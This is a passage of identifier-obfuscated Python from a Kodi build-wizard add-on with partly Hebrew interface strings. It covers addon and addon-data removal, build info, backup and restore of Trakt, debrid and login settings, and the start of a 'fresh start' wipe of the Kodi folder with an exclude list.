	if default ==None :default =wiz .Grab_Log (True )#line:4599
	O00OOO0O0O000OOO0 =O0000O000O00OOOO0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4600
	O00OOO0O0O000OOO0 .doModal ()#line:4601
	del O00OOO0O0O000OOO0 #line:4602
def removeAddon (OO00O0OO00O0O0000 ,O0O0O000OO0OOO0O0 ,over =False ):#line:4604
	if not over ==False :#line:4605
		O0OOOOO0OOOOO000O =1 #line:4606
	else :#line:4607
		O0OOOOO0OOOOO000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0O000OO0OOO0O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO00O0OO00O0O0000 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4608
	if O0OOOOO0OOOOO000O ==1 :#line:4609
		OO0OOOO0OO0OOO00O =os .path .join (ADDONS ,OO00O0OO00O0O0000 )#line:4610
		wiz .log ("Removing Addon %s"%OO00O0OO00O0O0000 )#line:4611
		wiz .cleanHouse (OO0OOOO0OO0OOO00O )#line:4612
		xbmc .sleep (1000 )#line:4613
		try :shutil .rmtree (OO0OOOO0OO0OOO00O )#line:4614
		except Exception as OOO000OO00OOOOOO0 :wiz .log ("Error removing %s"%OO00O0OO00O0O0000 ,xbmc .LOGNOTICE )#line:4615
		removeAddonData (OO00O0OO00O0O0000 ,O0O0O000OO0OOO0O0 ,over )#line:4616
	if over ==False :#line:4617
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0O0O000OO0OOO0O0 ))#line:4618
def removeAddonData (O0OOO00O00O00O0O0 ,name =None ,over =False ):#line:4620
	if O0OOO00O00O00O0O0 =='all':#line:4621
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4622
			wiz .cleanHouse (ADDOND )#line:4623
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4624
	elif O0OOO00O00O00O0O0 =='uninstalled':#line:4625
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4626
			OOOO0OO00000OO0OO =0 #line:4627
			for O0O0OOO000OOOOOO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4628
				OO000O0O000O00OO0 =O0O0OOO000OOOOOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4629
				if OO000O0O000O00OO0 in EXCLUDES :pass #line:4630
				elif os .path .exists (os .path .join (ADDONS ,OO000O0O000O00OO0 )):pass #line:4631
				else :wiz .cleanHouse (O0O0OOO000OOOOOO0 );OOOO0OO00000OO0OO +=1 ;wiz .log (O0O0OOO000OOOOOO0 );shutil .rmtree (O0O0OOO000OOOOOO0 )#line:4632
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO0OO00000OO0OO ))#line:4633
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4634
	elif O0OOO00O00O00O0O0 =='empty':#line:4635
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4636
			OOOO0OO00000OO0OO =wiz .emptyfolder (ADDOND )#line:4637
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO0OO00000OO0OO ))#line:4638
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4639
	else :#line:4640
		OO00O00000OOO0O00 =os .path .join (USERDATA ,'addon_data',O0OOO00O00O00O0O0 )#line:4641
		if O0OOO00O00O00O0O0 in EXCLUDES :#line:4642
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4643
		elif os .path .exists (OO00O00000OOO0O00 ):#line:4644
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOO00O00O00O0O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4645
				wiz .cleanHouse (OO00O00000OOO0O00 )#line:4646
				try :#line:4647
					shutil .rmtree (OO00O00000OOO0O00 )#line:4648
				except :#line:4649
					wiz .log ("Error deleting: %s"%OO00O00000OOO0O00 )#line:4650
			else :#line:4651
				wiz .log ('Addon data for %s was not removed'%O0OOO00O00O00O0O0 )#line:4652
	wiz .refresh ()#line:4653
def restoreit (O00000O0OOOOOO0O0 ):#line:4655
	if O00000O0OOOOOO0O0 =='build':#line:4656
		OO0OO0OO0O000O00O =freshStart ('restore')#line:4657
		if OO0OO0OO0O000O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4658
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4659
		wiz .skinToDefault ()#line:4660
	wiz .restoreLocal (O00000O0OOOOOO0O0 )#line:4661
def restoreextit (O0000000O00O00OO0 ):#line:4663
	if O0000000O00O00OO0 =='build':#line:4664
		O0O0O0OO0O000OO0O =freshStart ('restore')#line:4665
		if O0O0O0OO0O000OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4666
	wiz .restoreExternal (O0000000O00O00OO0 )#line:4667
def buildInfo (O0O0000OOOOO00O0O ):#line:4669
	if wiz .workingURL (SPEEDFILE )==True :#line:4670
		if wiz .checkBuild (O0O0000OOOOO00O0O ,'url'):#line:4671
			O0O0000OOOOO00O0O ,OOO0O0O00O0O00O0O ,OO0OOOOO0OOO0OOO0 ,OO000000OO0OOOOO0 ,OO000O000O0OO00O0 ,O000OO00OO0OOO00O ,OO00O0O000O00000O ,OOO000000O0OOOOOO ,O0OOO0000OOOO0O00 ,OOO0OO0000OO00OOO ,O0000O0OO000O000O =wiz .checkBuild (O0O0000OOOOO00O0O ,'all')#line:4672
			OOO0OO0000OO00OOO ='Yes'if OOO0OO0000OO00OOO .lower ()=='yes'else 'No'#line:4673
			OOO0O0000O00OOO00 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0000OOOOO00O0O )#line:4674
			OOO0O0000O00OOO00 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O0O00O0O00O0O )#line:4675
			if not O000OO00OO0OOO00O =="http://":#line:4676
				OO00O00000O0O00OO =wiz .themeCount (O0O0000OOOOO00O0O ,False )#line:4677
				OOO0O0000O00OOO00 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO00O00000O0O00OO ))#line:4678
			OOO0O0000O00OOO00 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000O000O0OO00O0 )#line:4679
			OOO0O0000O00OOO00 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OO0000OO00OOO )#line:4680
			OOO0O0000O00OOO00 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0OO000O000O )#line:4681
			wiz .TextBox (ADDONTITLE ,OOO0O0000O00OOO00 )#line:4682
		else :wiz .log ("Invalid Build Name!")#line:4683
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4684
def buildVideo (O00OOOO0O0OOOOO00 ):#line:4686
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4687
	if wiz .workingURL (SPEEDFILE )==True :#line:4688
		O00000000OOOO0000 =wiz .checkBuild (O00OOOO0O0OOOOO00 ,'preview')#line:4689
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00OOOO0O0OOOOO00 )#line:4690
		if O00000000OOOO0000 and not O00000000OOOO0000 =='http://':playVideo (O00000000OOOO0000 )#line:4691
		else :wiz .log ("[%s]Unable to find url for video preview"%O00OOOO0O0OOOOO00 )#line:4692
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4693
def dependsList (O000O0OO0O0O0OOO0 ):#line:4695
	OO0OO00O000OO0000 =os .path .join (ADDONS ,O000O0OO0O0O0OOO0 ,'addon.xml')#line:4696
	if os .path .exists (OO0OO00O000OO0000 ):#line:4697
		O0OOOO000000OO000 =open (OO0OO00O000OO0000 ,mode ='r');OOO00O0000OOOO0O0 =O0OOOO000000OO000 .read ();O0OOOO000000OO000 .close ();#line:4698
		O0OOO0OOO00O00O00 =wiz .parseDOM (OOO00O0000OOOO0O0 ,'import',ret ='addon')#line:4699
		O000000O00O00O000 =[]#line:4700
		for O0O00O00OOO0OO0O0 in O0OOO0OOO00O00O00 :#line:4701
			if not 'xbmc.python'in O0O00O00OOO0OO0O0 :#line:4702
				O000000O00O00O000 .append (O0O00O00OOO0OO0O0 )#line:4703
		return O000000O00O00O000 #line:4704
	return []#line:4705
def manageSaveData (OOOOOOOOOOOOO0000 ):#line:4707
	if OOOOOOOOOOOOO0000 =='import':#line:4708
		OOOO0OO0OO0OOO000 =os .path .join (ADDONDATA ,'temp')#line:4709
		if not os .path .exists (OOOO0OO0OO0OOO000 ):os .makedirs (OOOO0OO0OO0OOO000 )#line:4710
		OOO0O0OOOOOO0O00O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4711
		if not OOO0O0OOOOOO0O00O .endswith ('.zip'):#line:4712
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4713
			return #line:4714
		O0000O000OO0O0OO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4715
		O00OOO0O00O00000O =xbmcvfs .copy (OOO0O0OOOOOO0O00O ,O0000O000OO0O0OO0 )#line:4716
		wiz .log ("%s"%str (O00OOO0O00O00000O ))#line:4717
		extract .all (xbmc .translatePath (O0000O000OO0O0OO0 ),OOOO0OO0OO0OOO000 )#line:4718
		O0OO0OOOO0OO0O0O0 =os .path .join (OOOO0OO0OO0OOO000 ,'trakt')#line:4719
		O00O00OOO0O0OOO00 =os .path .join (OOOO0OO0OO0OOO000 ,'login')#line:4720
		OOOOOO00O0OO00OO0 =os .path .join (OOOO0OO0OO0OOO000 ,'debrid')#line:4721
		O0000OO0000O00OOO =0 #line:4722
		if os .path .exists (O0OO0OOOO0OO0O0O0 ):#line:4723
			O0000OO0000O00OOO +=1 #line:4724
			OOO000OOO000O0O0O =os .listdir (O0OO0OOOO0OO0O0O0 )#line:4725
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4726
			for O00O000O0OOOO000O in OOO000OOO000O0O0O :#line:4727
				O0O0OO000OOO00000 =os .path .join (traktit .TRAKTFOLD ,O00O000O0OOOO000O )#line:4728
				OOO00O000000O0OO0 =os .path .join (O0OO0OOOO0OO0O0O0 ,O00O000O0OOOO000O )#line:4729
				if os .path .exists (O0O0OO000OOO00000 ):#line:4730
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O000O0OOOO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4731
					else :os .remove (O0O0OO000OOO00000 )#line:4732
				shutil .copy (OOO00O000000O0OO0 ,O0O0OO000OOO00000 )#line:4733
			traktit .importlist ('all')#line:4734
			traktit .traktIt ('restore','all')#line:4735
		if os .path .exists (O00O00OOO0O0OOO00 ):#line:4736
			O0000OO0000O00OOO +=1 #line:4737
			OOO000OOO000O0O0O =os .listdir (O00O00OOO0O0OOO00 )#line:4738
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4739
			for O00O000O0OOOO000O in OOO000OOO000O0O0O :#line:4740
				O0O0OO000OOO00000 =os .path .join (loginit .LOGINFOLD ,O00O000O0OOOO000O )#line:4741
				OOO00O000000O0OO0 =os .path .join (O00O00OOO0O0OOO00 ,O00O000O0OOOO000O )#line:4742
				if os .path .exists (O0O0OO000OOO00000 ):#line:4743
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O000O0OOOO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4744
					else :os .remove (O0O0OO000OOO00000 )#line:4745
				shutil .copy (OOO00O000000O0OO0 ,O0O0OO000OOO00000 )#line:4746
			loginit .importlist ('all')#line:4747
			loginit .loginIt ('restore','all')#line:4748
		if os .path .exists (OOOOOO00O0OO00OO0 ):#line:4749
			O0000OO0000O00OOO +=1 #line:4750
			OOO000OOO000O0O0O =os .listdir (OOOOOO00O0OO00OO0 )#line:4751
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4752
			for O00O000O0OOOO000O in OOO000OOO000O0O0O :#line:4753
				O0O0OO000OOO00000 =os .path .join (debridit .REALFOLD ,O00O000O0OOOO000O )#line:4754
				OOO00O000000O0OO0 =os .path .join (OOOOOO00O0OO00OO0 ,O00O000O0OOOO000O )#line:4755
				if os .path .exists (O0O0OO000OOO00000 ):#line:4756
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O000O0OOOO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4757
					else :os .remove (O0O0OO000OOO00000 )#line:4758
				shutil .copy (OOO00O000000O0OO0 ,O0O0OO000OOO00000 )#line:4759
			debridit .importlist ('all')#line:4760
			debridit .debridIt ('restore','all')#line:4761
		wiz .cleanHouse (OOOO0OO0OO0OOO000 )#line:4762
		wiz .removeFolder (OOOO0OO0OO0OOO000 )#line:4763
		os .remove (O0000O000OO0O0OO0 )#line:4764
		if O0000OO0000O00OOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4765
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4766
	elif OOOOOOOOOOOOO0000 =='export':#line:4767
		O00OOOO000OO0O00O =xbmc .translatePath (MYBUILDS )#line:4768
		O0O000OOOO0OOOO0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4769
		traktit .traktIt ('update','all')#line:4770
		loginit .loginIt ('update','all')#line:4771
		debridit .debridIt ('update','all')#line:4772
		OOO0O0OOOOOO0O00O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4773
		OOO0O0OOOOOO0O00O =xbmc .translatePath (OOO0O0OOOOOO0O00O )#line:4774
		O0000O0OO00O00O00 =os .path .join (O00OOOO000OO0O00O ,'SaveData.zip')#line:4775
		O0OO0O0OOOOO0OO0O =zipfile .ZipFile (O0000O0OO00O00O00 ,mode ='w')#line:4776
		for O0OO00OO0OOOOOO00 in O0O000OOOO0OOOO0O :#line:4777
			if os .path .exists (O0OO00OO0OOOOOO00 ):#line:4778
				OOO000OOO000O0O0O =os .listdir (O0OO00OO0OOOOOO00 )#line:4779
				for OOOOOO0000OOOOOO0 in OOO000OOO000O0O0O :#line:4780
					O0OO0O0OOOOO0OO0O .write (os .path .join (O0OO00OO0OOOOOO00 ,OOOOOO0000OOOOOO0 ),os .path .join (O0OO00OO0OOOOOO00 ,OOOOOO0000OOOOOO0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4781
		O0OO0O0OOOOO0OO0O .close ()#line:4782
		if OOO0O0OOOOOO0O00O ==O00OOOO000OO0O00O :#line:4783
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0OO00O00O00 ))#line:4784
		else :#line:4785
			try :#line:4786
				xbmcvfs .copy (O0000O0OO00O00O00 ,os .path .join (OOO0O0OOOOOO0O00O ,'SaveData.zip'))#line:4787
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOO0O0OOOOOO0O00O ,'SaveData.zip')))#line:4788
			except :#line:4789
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0OO00O00O00 ))#line:4790
def freshStart (install =None ,over =False ):#line:4795
	if USERNAME =='':#line:4796
		ADDON .openSettings ()#line:4797
		sys .exit ()#line:4798
	O0O00OO0000OO0OOO =u_list (SPEEDFILE )#line:4799
	(O0O00OO0000OO0OOO )#line:4800
	OO00OO00O000OO000 =(wiz .workingURL (O0O00OO0000OO0OOO ))#line:4801
	(OO00OO00O000OO000 )#line:4802
	if KEEPTRAKT =='true':#line:4803
		traktit .autoUpdate ('all')#line:4804
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4805
	if KEEPREAL =='true':#line:4806
		debridit .autoUpdate ('all')#line:4807
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4808
	if KEEPLOGIN =='true':#line:4809
		loginit .autoUpdate ('all')#line:4810
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4811
	if over ==True :O0OOOO0O00O00O000 =1 #line:4812
	elif install =='restore':O0OOOO0O00O00O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4813
	elif install :O0OOOO0O00O00O000 =1 #line:4814
	else :O0OOOO0O00O00O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4815
	if O0OOOO0O00O00O000 :#line:4816
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4817
			OO000000O000O0000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4818
			skinSwitch .swapSkins (OO000000O000O0000 )#line:4821
			O0O0O0000000OO0O0 =0 #line:4822
			xbmc .sleep (1000 )#line:4823
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O0000000OO0O0 <150 :#line:4824
				O0O0O0000000OO0O0 +=1 #line:4825
				xbmc .sleep (1000 )#line:4826
				wiz .ebi ('SendAction(Select)')#line:4827
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4828
				wiz .ebi ('SendClick(11)')#line:4829
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4830
			xbmc .sleep (1000 )#line:4831
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4832
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4833
			return #line:4834
		wiz .addonUpdates ('set')#line:4835
		O0O0O0O0O0O00OOO0 =os .path .abspath (HOME )#line:4836
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4837
		OOOOOO0O00OO000O0 =sum ([len (O00O0OOOOOO0OOO0O )for O0OO00000000000O0 ,O0O0000O0O0000OO0 ,O00O0OOOOOO0OOO0O in os .walk (O0O0O0O0O0O00OOO0 )]);OOOO0OOO0O00O000O =0 #line:4838
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4839
		EXCLUDES .append ('My_Builds')#line:4840
		EXCLUDES .append ('archive_cache')#line:4841
		EXCLUDES .append ('script.module.requests')#line:4842
		EXCLUDES .append ('myfav.anon')#line:4843
		if KEEPREPOS =='true':#line:4844
			O0OO0OOO0O000000O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4845
			for OOOO000OOO00OO000 in O0OO0OOO0O000000O :#line:4846
				O0OOO0O000OO000O0 =os .path .split (OOOO000OOO00OO000 [:-1 ])[1 ]#line:4847
				if not O0OOO0O000OO000O0 ==EXCLUDES :#line:4848
					EXCLUDES .append (O0OOO0O000OO000O0 )#line:4849
		if KEEPSUPER =='true':#line:4850
			EXCLUDES .append ('plugin.program.super.favourites')#line:4851
		if KEEPMOVIELIST =='true':#line:4852
			EXCLUDES .append ('plugin.video.metalliq')#line:4853
		if KEEPMOVIELIST =='true':#line:4854
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4855
		if KEEPADDONS =='true':#line:4856
			EXCLUDES .append ('addons')#line:4857
		EXCLUDES .append ('plugin.video.elementum')#line:4862
		EXCLUDES .append ('script.elementum.burst')#line:4863
		EXCLUDES .append ('script.elementum.burst-master')#line:4864
		EXCLUDES .append ('plugin.video.quasar')#line:4865
		EXCLUDES .append ('script.quasar.burst')#line:4866
		EXCLUDES .append ('skin.estuary')#line:4867
		if KEEPWHITELIST =='true':#line:4870
			OO00O000O0O0O00OO =''#line:4871
			OOOO000O0O0OO000O =wiz .whiteList ('read')#line:4872
			if len (OOOO000O0O0OO000O )>0 :#line:4873
				for OOOO000OOO00OO000 in OOOO000O0O0OO000O :#line:4874
					try :O0OOOO0OOOOO0OOOO ,O000O00000O00OOO0 ,O00O0O0000000O00O =OOOO000OOO00OO000 #line:4875
					except :pass #line:4876
					if O00O0O0000000O00O .startswith ('pvr'):OO00O000O0O0O00OO =O000O00000O00OOO0 #line:4877
					O00OOOO00O00OOOOO =dependsList (O00O0O0000000O00O )#line:4878
					for OOO0000O00OO00000 in O00OOOO00O00OOOOO :#line:4879
						if not OOO0000O00OO00000 in EXCLUDES :#line:4880
							EXCLUDES .append (OOO0000O00OO00000 )#line:4881
						O000O00000OOOO000 =dependsList (OOO0000O00OO00000 )#line:4882
						for OO0OO0OOOOOO00O00 in O000O00000OOOO000 :#line:4883
							if not OO0OO0OOOOOO00O00 in EXCLUDES :#line:4884
								EXCLUDES .append (OO0OO0OOOOOO00O00 )#line:4885
					if not O00O0O0000000O00O in EXCLUDES :#line:4886
						EXCLUDES .append (O00O0O0000000O00O )#line:4887
				if not OO00O000O0O0O00OO =='':wiz .setS ('pvrclient',O00O0O0000000O00O )#line:4888
		if wiz .getS ('pvrclient')=='':#line:4889
			for OOOO000OOO00OO000 in EXCLUDES :#line:4890
				if OOOO000OOO00OO000 .startswith ('pvr'):#line:4891
					wiz .setS ('pvrclient',OOOO000OOO00OO000 )#line:4892
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4893
		O0O0O0O0000OOOO00 =wiz .latestDB ('Addons')#line:4894
		for O0000OO0OO000O0OO ,O000O0000OOOOOO00 ,O00O0000O0O00O00O in os .walk (O0O0O0O0O0O00OOO0 ,topdown =True ):#line:4895
			O000O0000OOOOOO00 [:]=[O0O0OOO00OOOO0O00 for O0O0OOO00OOOO0O00 in O000O0000OOOOOO00 if O0O0OOO00OOOO0O00 not in EXCLUDES ]#line:4896
			for O0OOOO0OOOOO0OOOO in O00O0000O0O00O00O :#line:4897
				OOOO0OOO0O00O000O +=1 #line:4898
				O00O0O0000000O00O =O0000OO0OO000O0OO .replace ('/','\\').split ('\\')#line:4899
				O0O0O0000000OO0O0 =len (O00O0O0000000O00O )-1 #line:4901
				if O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4902
				elif O0OOOO0OOOOO0OOOO =='MyVideos99.db'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4903
				elif O0OOOO0OOOOO0OOOO =='MyVideos107.db'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4904
				elif O0OOOO0OOOOO0OOOO =='MyVideos116.db'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4905
				elif O0OOOO0OOOOO0OOOO =='MyVideos99.db'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4906
				elif O0OOOO0OOOOO0OOOO =='MyVideos107.db'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4907
				elif O0OOOO0OOOOO0OOOO =='MyVideos116.db'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4908
